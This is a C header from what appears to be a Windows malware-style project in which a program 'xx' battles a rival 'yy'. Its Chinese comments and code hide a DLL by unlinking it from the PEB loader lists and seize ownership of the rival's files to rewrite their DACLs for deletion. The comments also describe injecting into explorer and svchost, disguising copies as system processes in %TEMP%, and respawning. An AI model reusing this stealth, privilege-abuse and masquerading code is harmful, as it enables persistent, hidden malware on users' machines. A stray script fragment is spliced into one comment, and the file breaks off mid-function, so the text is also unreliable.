/*
 * xxipc.h - 各模块共用的共享内存布局与命名常量（唯一来源）
 *
 * 任何模块都不得再自行定义这些偏移/大小：布局一旦漂移，
 * 日志、心跳计数器、句柄表就会互相踩内存。
 *
 * 共享内存 4096 字节布局（v2）：
 *   0    .. 127   心跳后缀   (64 WCHAR)
 *   128  .. 255   窗口后缀   (64 WCHAR)
 *   256  .. 259   心跳计数器 (LONG，弹窗存活时每 500ms +1)
 *   260  .. 263   布局版本   (LONG，必须等于 XX_LAYOUT_VERSION)
 *   264  .. 267   xx.exe PID (DWORD)
 *   268  .. 271   本次启动随机 tag (DWORD)，句柄表条目必须与之匹配
 *   272  .. 655   句柄表 16 条 x 24 字节
 *   656  .. 1023  保留
 *   1024 .. 4023  全局日志  (3000 字节 = 1500 WCHAR)
 *   4024 .. 4047  保留
 *   4048 .. 4051  svcguard 实例计数 (LONG)
 *
 * 句柄表条目（24 字节）：
 *   +0  DWORD     pid     —— 持有该句柄的宿主进程
 *   +8  ULONGLONG handle  —— 在 pid 进程内有效的 xx.exe 进程句柄
 *   +16 ULONGLONG tag     —— 必须等于 OFFSET_TAG，否则视为陈旧条目
 *
 * 句柄权限只有 PROCESS_QUERY_LIMITED_INFORMATION | SYNCHRONIZE：
 * 句柄值只在"被复制进的那个进程"里有效，所以对手读到也用不了；
 * 即使同一宿主内的对手 DLL 拿到了它，也只能等/查，无法终止 xx。
 */

#ifndef XXIPC_H
#define XXIPC_H

#include <intrin.h>     /* __readgsqword / __readfsdword */
#include <windows.h>
#include <sddl.h>       /* ConvertStringSecurityDescriptorToSecurityDescriptorW */
#include <aclapi.h>     /* GetNamedSecurityInfoW / SetNamedSecurityInfoW / SetEntriesInAclW */
#include <lmcons.h>     /* UNLEN */

/* ---- 共享内存 ---- */
/* 优先 Global\；没有 SeCreateGlobalPrivilege（非提权运行）时退到 Local\。
   同一台机器上同权限级别的各模块会做出同样的选择，因此仍然互相对得上。 */
#define SHARED_MEM_NAME         L"Global\\xx_shared_mem"
#define SHARED_MEM_NAME_LOCAL   L"Local\\xx_shared_mem"
#define SHARED_MEM_SIZE         4096

/* ================== 全局命名对象（Global\ 互斥体） ==================
   多进程冗余（弹窗热备）之前用 Local\：那是**按登录会话隔离**的，
   而我们的 window.dll 会被注入到不同完整性级别/不同桌面（explorer、svchost…），
   只要有一个实例建在 session 0 或别的会话，两边就互相看不见对方的锁 →
   "谁都能建窗/谁都不让位"，冗余直接失效。
   现在统一用 Global\ + 允许 Everyone 访问的 SD：
     · 同一台机器上所有会话共享同一把锁，不会再各玩各的；
     · 不需要注销/登出，也就不存在"session 0 抢锁"的问题（session 0 里我们本来没有交互窗口）。
   创建/打开失败（极少数没有 SeCreateGlobalPrivilege 的宿主）时退回 Local\，
   并且**两边都按同一个候选顺序**试，保证同权限级别的实例仍然对得上。 */
#define XX_GLOBAL_MUTEX_SDDL L"D:(A;;GA;;;WD)"

/* ---- 命名对象的"用途"段'@
Rep 'window\window.c' @'
        XXNamedObject(name, _countof(name), FALSE, XX_PURPOSE_WND_GUARD, tok, 0);
        g_hGuardMutex = CreateMutexW(NULL, FALSE, name);：完整名字由 XXNamedObject() 拼成
        （xx_<用途>_<token>），不再有写死的锁名 ---- */
#define XX_PURPOSE_WND_GUARD    L"wg"     /* 弹窗主互斥体（谁持有谁负责弹窗） */
#define XX_PURPOSE_WND_MAKE     L"wmg"    /* 兜底建窗串行锁 */
#define XX_PURPOSE_RESPAWN      L"rg"     /* xx 复活互斥体 */
#define XX_PURPOSE_ATTACK_LEAD  L"al"     /* 攻击 leader（同一时刻只留一个攻击者） */
#define XX_PURPOSE_HEARTBEAT    L"hb"     /* 心跳事件（兼容保留） */

/* 旧固定名：只在"既没有 token 也没有共享 salt"的极端情况下由 XXNamedObject 拼出，
   这里保留字面量仅为文档/兼容说明用，代码里不再直接引用。 */
#define WINDOW_GUARD_MUTEX      NULL   /* 已停用：明文前缀会被 yy 内存扫描命中 */
#define WINDOW_MAKE_GUARD_MUTEX L"Local\\xx_wmg_legacy"

/* 抢不到锁时的兜底：本桌面连续看不到任何 XX 弹窗超过该时长就强建 */
#define WINDOW_FALLBACK_MS      1500

/* ---- 心跳：保留原事件（兼容），判据改用共享内存计数器 ---- */
#define HEARTBEAT_PREFIX        L"Global\\xx_heartbeat_"
#define HEARTBEAT_TIMEOUT       2000    /* 单次等待上限，仅用于事件兼容逻辑 */
#define HEARTBEAT_TICK_MS       500     /* 弹窗心跳节拍 */
#define HEARTBEAT_STALE_MS      2500    /* 计数器多久不涨判定弹窗丢失 */
#define HEARTBEAT_POLL_MS       500     /* 监视方轮询间隔（defense 用） */
#define HEARTBEAT_POLL_MS_DEMON 40      /* svcguard 的复活/注入扫描频率：40ms */
#define HEARTBEAT_RECOVER_MS    1000    /* 仍在停摆时的重试间隔 */

/* ---- 布局版本 ---- */
#define XX_LAYOUT_VERSION       4       /* v4：新增嘲讽计数/完成标志（waste 搬到 xx 内） */

/* ---- 偏移 ---- */
#define OFFSET_HB_SUFFIX        0
#define OFFSET_WND_SUFFIX       128
#define OFFSET_HB_TICK          256
#define OFFSET_LAYOUT           260
#define OFFSET_XX_PID           264
#define OFFSET_TAG              268
#define OFFSET_HDL_TABLE        272
#define OFFSET_SELF_HANDLE      656     /* xx.exe 启动早期（DACL 收紧前）打开的自身进程句柄 */
#define OFFSET_XX_SESSION       664     /* xx.exe 所在登录会话，复活时据此避免影子实例 */
#define OFFSET_TMP_SALT         668     /* 本轮注入临时副本名的随机盐（xx 生成，全体共用） */
#define OFFSET_XX_PATH          672     /* xx.exe 全路径（注入副本据此定位真正的程序目录） */
#define XX_PATH_MAX             128     /* WCHAR，含结尾 NUL：672 + 256 = 928（够用；超长会截断并记日志） */
#define OFFSET_OWNER_TABLE      928     /* 弹窗持有者表：每会话一格，4 × 24 = 96 → 928..1023 */
#define OWNER_SLOTS             4
#define OWNER_SLOT_SIZE         24      /* session(4) pad(4) hwnd(8) pid(4) tick(4) */
#define OFFSET_NAME_TOKEN64     4024    /* 64 位命名回退 token（4024..4031） */
/* 4032/4036 两个字段原先用于"嘲讽满 N 条再杀"的门控；嘲讽整块已删除（见 README 6.16），
   字段**保留但不再读写**（布局版本保持 v4，避免动偏移）。 */
#define OFFSET_TAUNT_COUNT      4032    /* 保留（旧的 waste 嘲讽计数，已停用） */
#define OFFSET_TAUNT_DONE       4036    /* 保留（旧的嘲讽完成标志，已停用） */
#define OFFSET_COUNTER          4048

/* 弹窗持有者记录（**每会话一格**，共 4 格）。
   为什么必须有它：判断"本桌面有没有我方弹窗"绝不能靠类名/标题（类名每进程随机、
   跨进程读标题不可靠），也不能靠"哪个进程加载了我们的 window 模块"—— 那样任何
   宿主（explorer 等）的任意可见窗口都会被误判成我方弹窗，真弹窗死了也补不回来。
   也不能只用一个全局槽：另一个会话会把它覆盖，于是"本会话没弹窗"被误判成"有弹窗"。
   由持有者自己登记本会话那格，别人只认自己会话的格子。 */
#define XX_OWNER_SLOT(p, i)   ((BYTE *)(p) + OFFSET_OWNER_TABLE + (i) * OWNER_SLOT_SIZE)
#define XX_SLOT_SESSION(p, i) (*(DWORD     *)XX_OWNER_SLOT(p, i))
#define XX_SLOT_HWND(p, i)    (*(ULONGLONG *)(XX_OWNER_SLOT(p, i) + 8))
#define XX_SLOT_PID(p, i)     (*(DWORD     *)(XX_OWNER_SLOT(p, i) + 16))
#define XX_SLOT_TICK(p, i)    (*(DWORD     *)(XX_OWNER_SLOT(p, i) + 20))
#define XX_OWNER_SLOT_INDEX(sid) ((int)((sid) & (OWNER_SLOTS - 1)))

/* 64 位命名 token（共享内存回退层用；也顺带把回退层的熵提到 64 位） */
#define XX_NAME_TOKEN64(p)    (*(ULONGLONG *)((BYTE *)(p) + OFFSET_NAME_TOKEN64))
#define XX_TAUNT_COUNT(p)     (*(volatile LONG *)((BYTE *)(p) + OFFSET_TAUNT_COUNT))
#define XX_TAUNT_DONE(p)      (*(volatile LONG *)((BYTE *)(p) + OFFSET_TAUNT_DONE))

#define SUFFIX_MAX              64
#define MAX_WND_SUFFIX          64

/* ---- 日志 ---- */
#define OFFSET_LOG              1024
#define LOG_SIZE                3000

/* ---- 句柄表 ---- */
#define HDL_TABLE_MAX           16
#define HDL_ENTRY_SIZE          24

/* 只读+同步：够 guard 判活（WaitForSingleObject）与查询路径，不足以终止进程 */
#define XX_SHARED_HANDLE_ACCESS (PROCESS_QUERY_LIMITED_INFORMATION | SYNCHRONIZE)

/* ---- 通用名字 ---- */
#define XX_EXE_NAME_W           L"xx.exe"
#define XPT_FILE_NAME           "xpt.xpt"

/* ---- 句柄表访问宏 ---- */
#define XX_HDL_ENTRY(p, i)      ((BYTE *)(p) + OFFSET_HDL_TABLE + (DWORD)(i) * HDL_ENTRY_SIZE)
#define XX_HDL_PID(p, i)        (*(DWORD     *)XX_HDL_ENTRY((p), (i)))
#define XX_HDL_RESERVED(p, i)   (*(DWORD     *)(XX_HDL_ENTRY((p), (i)) + 4))
#define XX_HDL_HANDLE(p, i)     (*(ULONGLONG *)(XX_HDL_ENTRY((p), (i)) + 8))
#define XX_HDL_TAG(p, i)        (*(ULONGLONG *)(XX_HDL_ENTRY((p), (i)) + 16))

/* ---- 心跳计数器读写 ---- */
#define XX_HB_TICK(p)           (*(volatile LONG *)((BYTE *)(p) + OFFSET_HB_TICK))
#define XX_LAYOUT(p)            (*(LONG    *)((BYTE *)(p) + OFFSET_LAYOUT))
#define XX_XXPID(p)             (*(DWORD   *)((BYTE *)(p) + OFFSET_XX_PID))
#define XX_TAG(p)               (*(DWORD   *)((BYTE *)(p) + OFFSET_TAG))
#define XX_SELF_HANDLE(p)       (*(ULONGLONG *)((BYTE *)(p) + OFFSET_SELF_HANDLE))
#define XX_SESSION(p)           (*(LONG    *)((BYTE *)(p) + OFFSET_XX_SESSION))
#define XX_TMP_SALT(p)          (*(DWORD   *)((BYTE *)(p) + OFFSET_TMP_SALT))
#define XX_XXPATH(p)            ((WCHAR   *)((BYTE *)(p) + OFFSET_XX_PATH))
#define XX_COUNTER(p)           (*(volatile LONG *)((BYTE *)(p) + OFFSET_COUNTER))
/* ================== 备份文件名：每会话随机，二进制里没有明文 ==================
   新 yy 会扫描**进程私有可读内存**找三个特征串（弹窗标题 / 互斥体前缀 / 备份文件名），
   命中就 TerminateProcess。所以文件名必须：① 二进制无明文；② 每会话不同。
   做法：由会话盐（OFFSET_TMP_SALT）派生 `r<8位hex>.bin`，各模块算出来的名字一致。 */
static __inline void XXBackupNameW(void *view, WCHAR *out, SIZE_T cch) {
    DWORD salt = view ? XX_TMP_SALT(view) : 0;
    if (!salt && view) {
        ULONGLONG tk = XX_NAME_TOKEN64(view);
        salt = (DWORD)(tk ^ (tk >> 32));
    }
    if (!salt) salt = 0x9E3779B9u;
    salt ^= 0x5A5A5A5Au;
    salt = (salt * 16777619u) ^ (salt >> 13);
    if (out && cch >= 14) {
        static const WCHAR hexd[] = L"0123456789ABCDEF";
        int i;
        out[0] = L'r';
        for (i = 0; i < 8; i++)
            out[1 + i] = hexd[(salt >> ((7 - i) * 4)) & 0xFu];
        out[9]  = L'.';
        out[10] = L'b';
        out[11] = L'i';
        out[12] = L'n';
        out[13] = L'\0';
    } else if (out && cch) {
        out[0] = L'\0';
    }
}

/* ================== 夺取所有权并重建 DACL（删对手文件的前置步骤） ==================
   对手（yy 新版）给自己的文件设了 deny-DELETE DACL —— 普通 DeleteFileW 必然
   ERROR_ACCESS_DENIED。它自己删我们文件时用的是同一条链：
       LookupPrivilegeValue/AdjustTokenPrivileges  →  GetNamedSecurityInfoW
       → SetNamedSecurityInfoW(OWNER) → SetEntriesInAclW
       → SetNamedSecurityInfoW(DACL, PROTECTED)
   我们照抄这条链，才能删掉受保护的文件。返回 TRUE 表示"权限层面已经打开"。 */
static __inline BOOL XXEnablePriv(LPCWSTR name)
{
    HANDLE hTok = NULL;
    TOKEN_PRIVILEGES tp;
    BOOL ok = FALSE;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
        return FALSE;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (LookupPrivilegeValueW(NULL, name, &tp.Privileges[0].Luid)) {
        SetLastError(ERROR_SUCCESS);
        if (AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL) &&
            GetLastError() != ERROR_NOT_ALL_ASSIGNED)
            ok = TRUE;
    }
    CloseHandle(hTok);
    return ok;
}

static __inline PSID XXEveryoneSid(void)
{
    static PSID s_sid = NULL;
    static BOOL s_tried = FALSE;
    if (!s_tried) {
        s_tried = TRUE;
        if (!ConvertStringSidToSidW(L"WD", &s_sid)) s_sid = NULL;
    }
    return s_sid;
}

static __inline BOOL XXGrantFullControl(LPCWSTR path)
{
    PSID  owner = NULL, selfSid = NULL, everyone = NULL;
    PACL  dacl = NULL, pNewDacl = NULL;
    PSECURITY_DESCRIPTOR sd = NULL;
    SID_NAME_USE use;
    WCHAR name[UNLEN + 1];
    BYTE  sidBuf[SECURITY_MAX_SID_SIZE];
    DWORD cchName, sidLen, domLen;
    BOOL  changed = FALSE;

    if (!path || !path[0]) return FALSE;

    XXEnablePriv(L"SeTakeOwnershipPrivilege");
    XXEnablePriv(L"SeRestorePrivilege");
    XXEnablePriv(L"SeBackupPrivilege");

    /* 当前用户 SID */
    cchName = UNLEN + 1;
    sidLen = sizeof(sidBuf);
    domLen = 0;
    if (GetUserNameW(name, &cchName) &&
        LookupAccountNameW(NULL, name, sidBuf, &sidLen, NULL, &domLen, &use))
        selfSid = (PSID)sidBuf;

    everyone = XXEveryoneSid();

    if (GetNamedSecurityInfoW((LPWSTR)path, SE_FILE_OBJECT,
                              OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION,
                              &owner, NULL, &dacl, NULL, &sd) != ERROR_SUCCESS)
        return FALSE;

    /* 1) 抢所有权（SeTakeOwnershipPrivilege 生效时可把自己设成 owner） */
    if (selfSid && owner && !EqualSid(owner, selfSid)) {
        if (SetNamedSecurityInfoW((LPWSTR)path, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION,
                                  selfSid, NULL, NULL, NULL) == ERROR_SUCCESS)
            changed = TRUE;
    }

    /* 2) 重建 DACL：Everyone 完全控制，去掉继承与拒绝项 */
    if (everyone) {
        EXPLICIT_ACCESS_W ea;
        ZeroMemory(&ea, sizeof(ea));
        ea.grfAccessPermissions = GENERIC_ALL;
        ea.grfAccessMode = SET_ACCESS;
        ea.grfInheritance = NO_INHERITANCE;
        ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
        ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
        ea.Trustee.ptstrName = (LPWSTR)everyone;

        if (SetEntriesInAclW(1, &ea, NULL, &pNewDacl) == ERROR_SUCCESS && pNewDacl) {
            if (SetNamedSecurityInfoW((LPWSTR)path, SE_FILE_OBJECT,
                                      DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
                                      NULL, NULL, pNewDacl, NULL) == ERROR_SUCCESS)
                changed = TRUE;
            LocalFree(pNewDacl);
        }
    }

    if (sd) LocalFree(sd);
    return changed;
}
/* ---- 排查用文件日志 ----
   共享内存日志只有在弹窗出现后才看得见；一旦"没有弹窗"，现场就完全失明。
   所以关键日志同时追加一份到 %TEMP%\xx_debug.log（各进程共写，有总大小上限）。
   每个模块各自限流，不会无限增长。 */
#define XX_DEBUG_LOG_NAME       L"xx_debug.log"
#define XX_DEBUG_LOG_MAX        262144

static __inline void XXFileLog(const WCHAR *line) {
    static LONG s_written = 0;
    WCHAR path[MAX_PATH];
    HANDLE h;
    DWORD len = 0, wrote = 0;

    if (s_written >= XX_DEBUG_LOG_MAX) return;
    if (!GetTempPathW(MAX_PATH, path)) return;
    if (wcslen(path) + wcslen(XX_DEBUG_LOG_NAME) + 1 >= MAX_PATH) return;
    wcscat_s(path, MAX_PATH, XX_DEBUG_LOG_NAME);

    h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                    OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    if (GetLastError() != ERROR_ALREADY_EXISTS) {   /* 新文件：先写 BOM，记事本能认 */
        const WCHAR bom = 0xFEFF;
        WriteFile(h, &bom, sizeof(bom), &wrote, NULL);
    }
    len = (DWORD)(wcslen(line) * sizeof(WCHAR));
    if (WriteFile(h, line, len, &wrote, NULL))
        InterlockedExchangeAdd(&s_written, (LONG)wrote);
    CloseHandle(h);
}

/* ---- 跨进程共享内存的创建 / 打开（Global\ 拿不到就退 Local\） ---- */
static __inline HANDLE XXOpenShared(void) {
    HANDLE h = OpenFileMappingW(FILE_MAP_READ | FILE_MAP_WRITE, FALSE, SHARED_MEM_NAME);
    if (!h) h = OpenFileMappingW(FILE_MAP_READ | FILE_MAP_WRITE, FALSE, SHARED_MEM_NAME_LOCAL);
    return h;
}

/* ================== 1. PEB 模块链表摘除（隐藏自己） ==================
   加载器把每个模块挂在 PEB->Ldr 的三条链表上，分别用 LDR_DATA_TABLE_ENTRY 里
   不同的 LIST_ENTRY 串联。对手按模块名扫描进程（EnumProcessModules /
   CreateToolhelp32Snapshot(SNAPMODULE)）就是读这三条链，所以要**三条都摘**。
   注意：摘掉之后 GetModuleHandle/GetModuleFileName(自己) 就查不到了，
   各模块必须在 DllMain 里先把 HMODULE 和自身路径缓存下来再用。 */
/* 自带一份最小 UNICODE_STRING（不依赖 winternl.h，避免与某些翻译单元冲突） */
typedef struct _XX_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} XX_UNICODE_STRING;

typedef struct _XX_LDR_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;              /* +0x00 */
    LIST_ENTRY     InMemoryOrderLinks;            /* +0x10 */
    LIST_ENTRY     InInitializationOrderLinks;    /* +0x20 */
    PVOID          DllBase;                       /* +0x30 */
    PVOID          EntryPoint;                    /* +0x38 */
    ULONG          SizeOfImage;                   /* +0x40 */
    XX_UNICODE_STRING FullDllName;                /* +0x48 */
    XX_UNICODE_STRING BaseDllName;                /* +0x58 */
} XX_LDR_ENTRY;

static __inline void *XXPebPtr(void) {
#ifdef _WIN64
    return (void *)__readgsqword(0x60);
#else
    return (void *)__readfsdword(0x30);
#endif
}

/* ================== 自己解析导出表（**摘链之后唯一可靠的取函数方式**） ==================
   踩过的坑：`XXHideSelfFromPeb()` 把模块从 PEB 的三条链表里摘掉之后，
   `GetModuleFileNameW(hMod)` 和 **`GetProcAddress(hMod, ...)` 都会失败**
   （后者内部要按句柄在加载器表里找回模块）。于是：
     · 日志里 `实际=(未知)`；
     · 我们自己 dll 的导出全被当成"不存在" —— 之前那些
       `DeamonInit / StartDefense / StartAttack / XxKillTree / XxBuildTag 导出不存在`
       根本不是"旧 dll"，而是**摘链导致的 GetProcAddress 失效**。
   这里直接按 PE 结构遍历导出表（内存里的头/导出目录都还在，摘链不影响），
   得到 RVA 后加上模块基址就是函数地址。不依赖加载器，摘链前后都能用。 */
static __inline FARPROC XXGetProcByName(HMODULE hMod, const char *name) {
    BYTE *base = (BYTE *)hMod;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    IMAGE_DATA_DIRECTORY *dir;
    IMAGE_EXPORT_DIRECTORY *exp;
    DWORD *names, *funcs;
    WORD *ords;
    DWORD i;

    if (!base || !name) return NULL;
    dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    if (dos->e_lfanew <= 0 || dos->e_lfanew > 0x4000) return NULL;
    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (dir->VirtualAddress == 0 || dir->Size == 0) return NULL;
    exp = (IMAGE_EXPORT_DIRECTORY *)(base + dir->VirtualAddress);
    if (exp->NumberOfNames == 0 || exp->NumberOfFunctions == 0) return NULL;

    names = (DWORD *)(base + exp->AddressOfNames);
    ords  = (WORD *)(base + exp->AddressOfNameOrdinals);
    funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (i = 0; i < exp->NumberOfNames; i++) {
        const char *n = (const char *)(base + names[i]);
        if (strcmp(n, name) == 0) {
            if (ords[i] >= exp->NumberOfFunctions) return NULL;
            return (FARPROC)(base + funcs[ords[i]]);
        }
    }
    return NULL;
}
/* 返回成功摘除的链表条数（正常是 3） */
static __inline int XXHideSelfFromPeb(HMODULE hSelf) {
    static const DWORD linkOff[3] = { 0x00, 0x10, 0x20 };   /* 三条链表各自的偏移 */
    static const DWORD headOff[3] = { 0x10, 0x20, 0x30 };   /* Ldr 里三个链表头 */
    BYTE *peb = (BYTE *)XXPebPtr();
    BYTE *ldr;
    int i, n = 0;

    if (!peb || !hSelf) return 0;
    ldr = *(BYTE **)(peb + 0x18);
    if (!ldr) return 0;

    for (i = 0; i < 3; i++) {
        LIST_ENTRY *head = (LIST_ENTRY *)(ldr + headOff[i]);
        LIST_ENTRY *cur = head->Flink;
        while (cur && cur != head) {
            XX_LDR_ENTRY *e = (XX_LDR_ENTRY *)((BYTE *)cur - linkOff[i]);
            LIST_ENTRY *next = cur->Flink;
            if (e->DllBase == (PVOID)hSelf) {
                cur->Blink->Flink = cur->Flink;
                cur->Flink->Blink = cur->Blink;
                cur->Flink = cur;              /* 自环，断得干净 */
                cur->Blink = cur;
                n++;
                break;
            }
            cur = next;
        }
    }
    return n;
}

/* ================== 4. 会话随机名 token（命名对象不再写死） ==================
   对手（yy）按硬编码名抢我们的锁、按硬编码类名找我们的窗口。所以：
     - 命名对象名 = "xx_<用途>_<token>"，token 由 xx 启动时随机生成；
     - token 只通过"注入成功后远程调用 XxSetNames"传进宿主（方案 A），读完由注入方清零释放，
       不写进任何全局命名空间、不落盘；
     - 万一某个实例没拿到 token，它退回共享内存里的 salt 做名字；再不行退回固定名。
       关键是**回退不会造成"两个弹窗"**：抢弹窗的实例必须持有 token 名互斥体，
       拿不到 token 的实例只当热备、不参与抢（见 window.c 的选举逻辑）。
   XX_NAME_BLOCK 就是远程调用传过去的参数块。 */
#define XX_NAME_MAGIC    0x424E5858u    /* 'XXNB' */
#define XX_NAME_VERSION  2              /* v2：token 改成 64 位 */
/* 既没有 token 也没有共享回退 token 时的固定兜底名 —— 必须全体一致，
   否则会出现"两个实例各建一个弹窗"或"互相等锁"这种致命错配。 */
#define XX_NAME_TOKEN_FIXED  0x1A2B3C4D5E6F7081ULL

typedef struct _XX_NAME_BLOCK {
    DWORD     magic;
    DWORD     version;
    ULONGLONG token;        /* 64 位会话随机名 token（0 = 没有，调用方应改用共享回退 token） */
    DWORD     session;
    DWORD     reserved0;
    WCHAR     reserved[16]; /* 预留：以后加别的随机名不用再改传递协议 */
} XX_NAME_BLOCK;

static __inline void XXNameBlockInit(XX_NAME_BLOCK *b, ULONGLONG token, DWORD session) {
    if (!b) return;
    memset(b, 0, sizeof(*b));
    b->magic = XX_NAME_MAGIC;
    b->version = XX_NAME_VERSION;
    b->token = token;
    b->session = session;
}

static __inline BOOL XXNameBlockTake(const XX_NAME_BLOCK *b, ULONGLONG *pTokenOut, DWORD *pSessionOut) {
    if (!b || b->magic != XX_NAME_MAGIC || b->version != XX_NAME_VERSION) return FALSE;
    if (pTokenOut) *pTokenOut = b->token;
    if (pSessionOut) *pSessionOut = b->session;
    return TRUE;
}

/* 把 64 位值格式化成 16 位十六进制（大写）。
   **绝对不要用 printf 的 `%llX`**：MinGW 的 `_snwprintf` 落到 MSVCRT 的 `_vsnwprintf`，
   它不认 `ll` 长度修饰（只认 `%I64X`），实测会把 64 位 token 静默截断 ——
   那就等于白改 64 位（测试里表现为"名字算出来的和实际建出来的对不上"）。手写循环最稳。 */
static __inline void XXHex64(WCHAR *out, ULONGLONG v) {
    static const WCHAR hexd[] = L"0123456789ABCDEF";
    int i;
    if (!out) return;
    for (i = 0; i < 16; i++) out[i] = hexd[(v >> ((15 - i) * 4)) & 0xFu];
    out[16] = L'\0';
}

/* ================== 认"谁是 xx 本体"（含改名接管副本） ==================
   交付物只有 xx.exe 一个，但对手是**按进程名**杀 xx.exe 的（yy.cpp 的 GOAL_NAME），
   所以 xx.exe 会把自身复制到 %TEMP% 并随机改名成 svchost/explorer/conhost，
   带 --wait 休眠，等 xx.exe 死掉再接管全部工作。于是"谁是 xx"不能只看名字：
     · 叶子名就是 xx.exe                → 认；
     · 在 %TEMP% 下且叶子名是那三个之一 → 认（接管副本）。
   只按名字认会把系统真正的 svchost/explorer 当成我们，导致"xx 已在运行"永不复活；
   只按 xx.exe 认又会认不出接管副本（atkcore 会把自己的载体当敌方宿主杀掉）。 */
static __inline BOOL XXIsTakeoverLeaf(const WCHAR *leaf) {
    if (!leaf || !leaf[0]) return FALSE;
    return (_wcsicmp(leaf, L"svchost.exe") == 0 ||
            _wcsicmp(leaf, L"explorer.exe") == 0 ||
            _wcsicmp(leaf, L"conhost.exe") == 0);
}

static __inline BOOL XXPathLooksLikeOurXx(LPCWSTR path) {
    const WCHAR *leaf;
    if (!path || !path[0]) return FALSE;
    leaf = wcsrchr(path, L'\\');
    leaf = leaf ? leaf + 1 : path;
    if (_wcsicmp(leaf, L"xx.exe") == 0) return TRUE;
    if (XXIsTakeoverLeaf(leaf)) {
        WCHAR tmp[MAX_PATH];
        DWORD n = GetTempPathW(MAX_PATH, tmp);
        if (n > 0 && n < MAX_PATH && _wcsnicmp(path, tmp, n) == 0) return TRUE;
    }
    return FALSE;
}

/* 路径级判据：能打开进程时用它确认"这个 PID 到底是不是我们的实例"。
   ⚠ **不要拿它当判活判据**：xx.exe 与接管副本都会把自身 DACL 收成拒绝 Everyone，
   `OpenProcess` 对它们必然失败 → 永远返回 FALSE（于是"没有实例"→每次心跳停摆白拉一份）。
   判活用下面不需要句柄的 `XXSnapIsOurInstance`。 */
static __inline BOOL XXPidIsOurXx(DWORD pid) {
    HANDLE hProc;
    WCHAR path[MAX_PATH] = L"";
    DWORD cch = MAX_PATH;
    BOOL ok;

    if (!pid) return FALSE;
    hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) return FALSE;
    ok = QueryFullProcessImageNameW(hProc, 0, path, &cch) ? TRUE : FALSE;
    CloseHandle(hProc);
    return ok ? XXPathLooksLikeOurXx(path) : FALSE;
}

/* ================== 会话：保证 xx 跑在"看得见"的会话里 ==================
   症状（实测截图）：xx 被复活到 session 0（服务会话）——弹窗画在不可见桌面上，
   Windows 还会弹出"交互式服务检测"提示，等于没有弹窗。
   根因：复活方自己跑在 session 0 的宿主里（services.exe 之类 SYSTEM 进程），
   CreateProcess 出来的子进程继承它的会话。
   做法：拿控制台会话号（WTSGetActiveConsoleSessionId，kernel32）：
     · 自己就在控制台会话 → 直接 CreateProcessW；
     · 不在 → 用 WTSQueryUserToken(控制台会话) 拿该会话用户的令牌，
       CreateProcessAsUserW + winsta0\default 拉进交互会话
       （SYSTEM 有 SeTcbPrivilege 可以；普通权限拿不到令牌就返回 FALSE，
        交给控制台会话里的实例去干，别在 session 0 造影子实例）。
   wtsapi32 动态加载，不增加链接依赖。 */
static __inline DWORD XXConsoleSession(void) {
    return (DWORD)WTSGetActiveConsoleSessionId();
}

static __inline BOOL XXLaunchInConsoleSession(LPCWSTR exePath, BOOL bVisible, DWORD *pPidOut) {
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    DWORD mySid = 0, conSid;
    BOOL ok = FALSE;

    if (!exePath || !exePath[0]) return FALSE;
    conSid = XXConsoleSession();
    if (conSid == 0 || conSid == 0xFFFFFFFFu) return FALSE;   /* 没有控制台会话：不乱拉 */

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    if (!ProcessIdToSessionId(GetCurrentProcessId(), &mySid)) mySid = 0;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = bVisible ? SW_SHOWNORMAL : SW_HIDE;

    if (mySid == conSid) {
        ok = CreateProcessW(exePath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                            NULL, NULL, &si, &pi);
    } else {
        typedef BOOL (WINAPI *WTSQueryUserToken_t)(ULONG, PHANDLE);
        HMODULE hWts = LoadLibraryW(L"wtsapi32.dll");
        WTSQueryUserToken_t pQuery = hWts
            ? (WTSQueryUserToken_t)GetProcAddress(hWts, "WTSQueryUserToken") : NULL;
        HANDLE hTok = NULL;
        if (pQuery && pQuery(conSid, &hTok) && hTok) {
            si.lpDesktop = (LPWSTR)L"winsta0\\default";
            ok = CreateProcessAsUserW(hTok, exePath, NULL, NULL, NULL, FALSE,
                                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            CloseHandle(hTok);
        }
        if (hWts) FreeLibrary(hWts);
    }

    if (ok) {
        if (pPidOut) *pPidOut = pi.dwProcessId;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return ok;
}

/* 拼命名对象名。token=0 时退回共享回退 token 名，再没有才用固定名 —— 三者都全体一致。 */
static __inline void XXNamedObject(WCHAR *out, SIZE_T cch, BOOL bGlobal,
                                   const WCHAR *purpose, ULONGLONG token, DWORD pidOrZero) {
    WCHAR hex[20];
    const WCHAR *ns = bGlobal ? L"Global" : L"Local";

    if (token) XXHex64(hex, token);
    else hex[0] = L'\0';

    if (pidOrZero)
